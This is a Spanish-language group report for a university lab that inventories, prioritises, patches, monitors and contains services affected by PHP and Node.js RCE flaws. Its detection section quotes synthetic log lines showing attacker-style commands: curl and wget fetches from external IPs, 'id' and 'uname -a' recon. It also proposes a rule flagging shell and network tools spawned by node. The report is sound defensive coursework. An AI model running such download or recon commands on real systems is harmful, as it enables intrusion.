# Entregable — TP PHP2Shell / Node2Shell

**Grupo:** 02 · **Fork del grupo:** https://github.com/FrancoPetosa99/goys-2026-tp-vulnerabilidades · **Rama:** `grupo-02`
**Fecha:** jueves 29/10/2026

| Integrante | Usuario de GitHub | Rol en el TP |
|---|---|---|
| Eliseche, Martín | MartinEliseche | Inventario y arranque del laboratorio |
| Petosa Ayala, Franco | FrancoPetosa99 | Cambios y parche |
| Gutierrez Mora, Agustín | agugutierrezz | Detección |
| Bresciani, Isabella | IsabellaBresciani | Contención |
| Kalpin, Sofía | Sokalpin | Priorización y comunicación |

> Roles sugeridos: inventario, cambios/parche, detección, contención/comunicación.
> Todos tienen que poder explicar su parte y una parte ajena.

---

## 1. Inventario

| Activo | Versión | ¿Expuesto a Internet? | ¿Procesa contenido no confiable? | ¿Afectado? | Evidencia |
|--------|---------|:---------------------:|:--------------------------------:|:----------:|-----------|
| Portal PHP | PHP 8.3.35, imagen `php:8.3.35-apache` (Apache + mod_php) | Sí (supuesto: publicado detrás de un proxy) | Sí (requests HTTP y subida de archivos) | **Sí**: PHP2Shell (corregido en 8.3.36) | `inventario.sh`: `PHP 8.3.35` y `session.upload_progress.enabled=1`; `docker ps`: imagen `-apache` |
| API Node.js | Node v22.23.3, Brotli 1.1.0 embebido en el runtime, Express 5 | Sí (supuesto: publicada detrás de un proxy) | Sí (`POST /decode` acepta cuerpos `Content-Encoding: br`) | **Sí**: Node2Shell (corregido en 22.23.4) | `inventario.sh`: `v22.23.3 / brotli 1.1.0` y "sin paquete brotli externo: lo aporta el runtime" |
| Servicio Python | Python 3.11.18, paquete brotli 1.0.9 (PyPI) | No (solo red interna) | Indirectamente (cuerpos `br` que le envían otros servicios) | **Sí**: Node2Shell / Brotli (corregido en 1.0.10, 1.1.1 o 1.2.1) | `inventario.sh`: `python 3.11.18` y `brotli 1.0.9` |

Salidas completas en `capturas/01-compose-ps.txt` y `capturas/02-inventario.txt`.

**Notas sobre la evidencia:**

- El `(cli)` que muestra `php -v` corresponde a la línea de comandos dentro del
  contenedor, no al portal web. Que el portal corra con Apache + mod_php se infiere de
  la imagen `php:8.3.35-apache`; el árbol de procesos con `apache2` está en
  `capturas/03-detectar.txt`.
- Node trae Brotli **dentro del runtime** (`node:zlib`), por eso no aparece en
  `package.json` ni en `npm ls`. Un inventario basado solo en el manifiesto de
  dependencias habría concluido que Node no usa Brotli, y sería un error.

**Supuestos de exposición:** en el laboratorio ningún contenedor publica puertos al
host (`docker ps` solo muestra `80/tcp`, `3000/tcp` y `8000/tcp`) y la red `labnet` es
interna, así que literalmente nada está expuesto a Internet. Asumimos que en
producción el portal PHP y la API Node están publicados detrás de un reverse proxy, y
que el servicio Python solo es accesible desde la red interna. Si el proxy
descomprimiera Brotli antes de reenviar, el decoder vulnerable también estaría en el
proxy.

---

## 2. Priorización y decisión

| Activo | CVSS | Explotación real | Exposición | Criticidad | Decisión y plazo |
|--------|:----:|:----------------:|:----------:|:----------:|------------------|
| Portal PHP | 9.2 | **Sí**: en KEV desde el 26/10 | Alta (supuesto: publicado, Apache + mod_php) | Alta (supuesto: portal con subida de archivos y datos personales) | **1º. Emergencia:** mitigar de inmediato (`upload_progress=0`) y parchear a 8.3.36 en menos de 24 h. Cazar señales de compromiso previo |
| API Node.js | 9.2 | **Sí**: en KEV desde el 27/10 (vence el 10/11). El exploit público visto falla en la última etapa, pero hubo RCE en laboratorio y los intentos fallidos tumban el proceso (DoS) | Alta (supuesto: publicada) | Media/alta | **2º. Emergencia escalonada:** parchear a 22.23.4 en el mismo cambio o en menos de 72 h. Mientras tanto, rechazar `Content-Encoding: br` en el proxy si no hace falta |
| Servicio Python | 9.2 | El CVE de Brotli está en KEV; los reportes citados en el contexto son contra Node.js, no contra Python | Baja (solo red interna) | Media | **3º. Urgente:** actualizar brotli a 1.2.1 en el mismo cambio o en la semana. La red interna sin salida reduce el riesgo mientras tanto |

**Justificación:** los tres tienen el mismo CVSS (9.2) y las dos vulnerabilidades ya
están en KEV, así que ni el CVSS ni KEV desempatan. Ordenamos por **cuán confiable es
la explotación** y por **exposición**. PHP2Shell va primero: la explotación es real,
no necesita nada de la aplicación (hasta una página mínima es vulnerable) y el portal
es el activo más expuesto. Node2Shell va segundo: está en KEV, pero el exploit
público visto falla en la etapa final, requiere que la API decodifique Brotli y su
efecto más probable hoy es una caída del proceso. Python va tercero por estar solo en
la red interna.

**Qué evidencia nueva cambiaría el orden:**

- Si aparece un exploit de Node2Shell que funcione de forma confiable, la API pasa a
  emergencia al mismo nivel que PHP.
- Si se descubre que el servicio Python recibe datos directamente de clientes
  externos, sube de prioridad.
- Si el portal PHP no estuviera publicado, bajaría un escalón, pero seguiría primero
  por explotación confirmada y por no depender de la aplicación.

**Nota sobre los plazos:** en el taller aplicamos los tres cambios en una sola
operación, así que en la práctica los tres activos quedaron parcheados el mismo día
(ver sección 3). El orden de la tabla es el que usaríamos si no pudiéramos parchear
todo a la vez.

---

## 3. Mitigación, parche y reversión

Todas las horas están en UTC (Argentina = UTC-3).

| Fecha/hora | Activo | Cambio | Antes | Después | Reversión |
|------------|--------|--------|-------|---------|-----------|
| 29/10/2026, entre 21:44:31 UTC (`capturas/04`) y 21:59:40 UTC (`capturas/07`) | Portal PHP | `session.upload_progress.enabled = 0` en `php/php.ini` y `docker compose restart php-lab` (mitigación temporal) | `1` (`capturas/05-php-antes.txt`) | `0` (`capturas/06-php-despues.txt`) | Volver a `= 1` en `php.ini` y `docker compose restart php-lab` |
| 29/10/2026, 22:17:37 UTC | Portal PHP | Imagen `php:8.3.35-apache` → `php:8.3.36-apache` (`parchear.sh`) | `PHP 8.3.35` | `PHP 8.3.36` | `docker compose --env-file versions.env up -d --build` sin las variables del script: vuelve a los tags de `versions.env` |
| 29/10/2026, 22:17:37 UTC | API Node | Imagen Node `22.23.3-bookworm-slim` → `22.23.4-bookworm-slim` | `v22.23.3` | `v22.23.4` (el string de Brotli sigue en 1.1.0 por el backport) | Ídem |
| 29/10/2026, 22:17:37 UTC | Servicio Python | `brotli` 1.0.9 → 1.2.1 | `brotli 1.0.9` | `brotli 1.2.1` | Ídem |

**Cómo se aplicó el parche:** `./scripts/parchear.sh` define `PHP_TAG`, `NODE_TAG` y
`BROTLI_VERSION` como variables de entorno, que tienen prioridad sobre `versions.env`,
y corre `docker compose up -d --build`. Los tres contenedores se recrearon en la misma
operación (`capturas/13-hora-recreacion.txt`). La mitigación de `upload_progress` **se
mantiene** después del parche, porque `php.ini` es un archivo montado y el parche no
lo toca.

**Trampa de Node:** después del parche, `process.versions.brotli` sigue diciendo
`1.1.0`. No significa que siga vulnerable: el fix se aplicó dentro del decoder que
trae Node, sin cambiar ese string. La señal confiable es la versión de Node (22.23.4).
Un escáner que marque "Brotli 1.1.0 = vulnerable" daría un falso positivo.

**Advertencia sobre la persistencia:** el parche se aplica con variables de entorno y
**no se guardó en `versions.env`**. Por eso `docker compose config` sin esas variables
sigue mostrando los tags viejos (`capturas/17-capabilities.txt` muestra
`php:8.3.35-apache`, Node `22.23.3` y brotli `1.0.9`). Un `docker compose up -d`
común, sin las variables, recrearía los contenedores con los tags de `versions.env`,
que son los vulnerables. Para dejar el parche como estado permanente habría que
actualizar `versions.env` o repetir el comando de `parchear.sh`.

**Prueba funcional mínima:** `docker compose ps` muestra los 3 contenedores `healthy`
tras el parche (`capturas/11-compose-ps-despues.txt`). El healthcheck de cada servicio
comprueba que responde. El inventario posterior confirma las versiones nuevas
(`capturas/11-inventario-despues.txt`) y `upload_progress=0` sigue activo
(`capturas/12-php-tras-parche.txt`).

**Intentos fallidos (declarados):** el primer `parchear.sh` (22:04 UTC) falló al
construir Node con `UNABLE_TO_VERIFY_LEAF_SIGNATURE` al contactar el registro de npm,
y el segundo falló con un timeout hacia Docker Hub. Los dos errores fueron de red del
equipo, no del laboratorio. En esos intentos no se cambió ningún contenedor, y la
evidencia quedó en `capturas/09-parchear.txt` y `capturas/09b-parchear-reintento.txt`.
El tercer intento (22:17 UTC) funcionó. Las capturas `08` y `10` (horas del primer
intento) corresponden a ese intento fallido. Una corrida posterior del script
(`capturas/09c-parchear-reintento2.txt`) ya no cambió nada.

**Qué no se pudo probar:**

- La subida de archivos en el navegador: los contenedores no publican puertos y no se
  modificó el compose, así que no se pudo abrir el portal desde el navegador.
- `upload_progress` se verificó con `ini_get` desde la línea de comandos dentro del
  contenedor, que lee el mismo `php.ini` montado, pero no se comprobó desde una
  request web a Apache.
- No se probó una decodificación Brotli real contra Node y Python después del parche:
  solo el healthcheck y las versiones.

---

## 4. Detección y caza

El análisis completo está en [`deteccion.md`](deteccion.md). Resumen:

**Hipótesis:** si PHP2Shell o Node2Shell fueron explotados, esperamos ver a `apache2`,
`node` o `python` como proceso padre de `sh`, `bash`, `curl`, `wget` o `nc`, a partir
del 21/10, con comandos de reconocimiento (`id`, `uname`) o descargas a IPs externas.

**Hallazgos en `audit.log`:**

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|-------------------|------|--------------|:---------:|---------|
| 6–7 · 09:42:17 | web01 | `apache2` → `sh -c id` → `id` | **Sí** | El servidor web lanza un shell y corre `id`, típico tras una RCE |
| 9–10 · 09:43:03 | api01 | `node` → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | Node lanza un shell para descargar algo |
| 14 · 09:44:22 | web01 | `apache2` → `wget http://198.51.100.9/a` | **Sí** | Descarga directa, sin shell en el medio |
| 16–17 · 09:45:10 | svc01 | `python` → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento del sistema en el servicio interno |
| 8, 13, 21 | db01 | `sshd` → `bash` | **Indeterminado** | Es lo que genera un login SSH legítimo; sin usuario ni IP no se puede afirmar |

**¿Hay compromiso?** Indicios fuertes de ejecución remota de comandos en web01, api01
y svc01. **Compromiso probable, pero no confirmado:** el log muestra que `curl` y
`wget` se lanzaron, no si descargaron algo, y no hay usuario ni IP de origen.

**Regla propuesta para Node.js:** observa la creación de procesos y dispara cuando el
padre es `node` y el hijo es `sh`, `bash`, `dash`, `curl`, `wget` o `nc`. Falsos
negativos: un reverse shell en JavaScript puro sin procesos hijos, binarios
renombrados, otros intérpretes (`python3`, `perl`) y los nietos si solo se mira padre →
hijo directo.

**Limitaciones del log:** no hay usuario, IP de origen, resultado del comando ni
conexiones de red; es una sola fuente, sintética, con unos 9 minutos de retención
(no cubre desde el 17/10), y no trae hash de los binarios.

---

## 5. Contención

| Control | Configuración | Evidencia | ¿Funciona? |
|---------|---------------|-----------|:----------:|
| Red sin salida | `labnet` con `internal: true` | `capturas/14-contencion.txt`: `SIN SALIDA` en PHP, Node (`TypeError`) y Python (`URLError`) | ✅ probado |
| Usuario sin privilegios | `user: node` en Node, `user: nobody` en Python. PHP no define `user:`: Apache arranca como root y atiende con workers `www-data` | `capturas/15-pids-user.txt` y `capturas/03-detectar.txt` (`docker top`: proceso maestro root, workers `www-data`, Node UID 1000, Python `nobody`) | ⚠️ parcial |
| Filesystem read-only | `read_only: true` en los 3 servicios; en PHP, además, `public` y `php.ini` montados de solo lectura | `capturas/14-contencion.txt` (5 apariciones de `read_only`) y `capturas/20-readonly-node.txt`: `touch /app/prueba.txt` en `node-lab` falla con `Read-only file system` | ✅ probado en Node (en PHP y Python solo declarado) |
| Capabilities mínimas | `cap_drop: ALL` y `no-new-privileges` en los 3 servicios. PHP recupera `CHOWN`, `SETUID`, `SETGID`, `DAC_OVERRIDE` y `NET_BIND_SERVICE` | `capturas/17-capabilities.txt`, `capturas/15-pids-user.txt` y `capturas/21-caps-node.txt`: en `node-lab`, `CapEff` y `CapBnd` valen `0000000000000000` | ⚠️ parcial: probado en Node; la configuración de PHP conserva 5 capabilities y no se midió en ejecución |
| Límites de memoria/PIDs | `mem_limit`: Node 256 MiB, PHP 256 MiB, Python 128 MiB. `pids_limit`: 100, 100 y 50 | `capturas/14-contencion.txt` y `capturas/15-pids-user.txt` (el orden coincide con `capturas/17`: Node, PHP, Python) | ✅ declarado |
| Rechazo de Brotli innecesario | **No aplicado** | `capturas/18-brotli-en-codigo.txt`: `node/server.js` (líneas 20–25) y `python/app.py` (líneas 34–36) decodifican cuerpos `Content-Encoding: br` | ❌ no aplicado |

**Prueba de salida a Internet:** `SIN SALIDA` en los tres servicios. Aunque un atacante
logre ejecutar comandos, un `curl` o `wget` como los del `audit.log` no podría
descargar una segunda etapa ni sacar datos hacia afuera.

**Prueba de que el servicio sigue funcionando:** `capturas/16-compose-ps-final.txt`
muestra los 3 contenedores `healthy` tras el parche.

**Riesgo residual:**

- **Apache con proceso maestro root** y capabilities devueltas (`SETUID`, `SETGID`,
  `DAC_OVERRIDE`): una RCE en PHP parte de una posición más fuerte que en Node o Python.
- **Escalada por el kernel:** los contenedores comparten el kernel del equipo, y los
  controles de arriba no frenan una vulnerabilidad de kernel. La cadena PHP2Shell +
  Fragnesia (CVE-2026-46300, en KEV desde el 28/10) llegó a root en menos de 15
  minutos en una campaña documentada. El kernel de este equipo es
  `6.18.33.2-microsoft-standard-WSL2`, compilado el 18/06/2026 (`capturas/19-kernel.txt`).
  El contexto del TP indica que Fragnesia afecta kernels anteriores al 13/05/2026, así
  que la fecha **sugiere**, pero no prueba, que ese kernel ya incluye el fix: no lo
  verificamos con el proveedor del kernel.
- **Brotli sin filtrar:** mientras no se rechace `br` en el proxy o en la aplicación,
  la superficie de Node2Shell sigue abierta aunque esté parcheado el runtime.

---

## 6. Conclusión (5 líneas)

1. Un inventario por manifiesto falla: Node "no tenía" Brotli en `npm ls` y lo traía el
   runtime, así que hay que inventariar runtimes y SAPI, no solo dependencias.
2. En el activo con explotación confirmada conviene mitigar antes de parchear
   (`upload_progress=0`) y parchear a continuación; la versión que cuenta es la del
   runtime, porque Brotli sigue diciendo 1.1.0 aun parcheado.
3. La red sin salida convierte una RCE en un incidente acotado, pero no frena una
   escalada: Apache corre con un maestro root y el kernel es compartido (Fragnesia).
4. Las reglas de detección tienen que contemplar a los nietos y las descargas sin shell,
   y el parche tiene que quedar persistido (no solo en variables de entorno).
5. En las primeras 2 horas haríamos inventario automatizado, mitigación inmediata en el
   portal, bloqueo de `br` en el proxy mientras se parchea Node y una caza retroactiva
   desde el 17/10, no desde la fecha del parche.

---

## 7. Checklist antes de entregar

- [x] El laboratorio arrancó y los 3 servicios quedaron `healthy`.
- [x] Inventario con evidencia (versión, SAPI, configuración).
- [x] Matriz con decisión y plazo.
- [x] Parche aplicado y verificado; reversión documentada.
- [x] Al menos 3 controles de contención probados (red sin salida, usuario sin privilegios, filesystem read-only y capabilities en Node).
- [x] `deteccion.md` completo.
- [x] `informe.md` individual completo.
- [x] Sin claves, tokens ni placeholders.
- [ ] Repo pusheado y PR abierto.

Checklist completa: [`../docs/checklist-entrega.md`](../docs/checklist-entrega.md).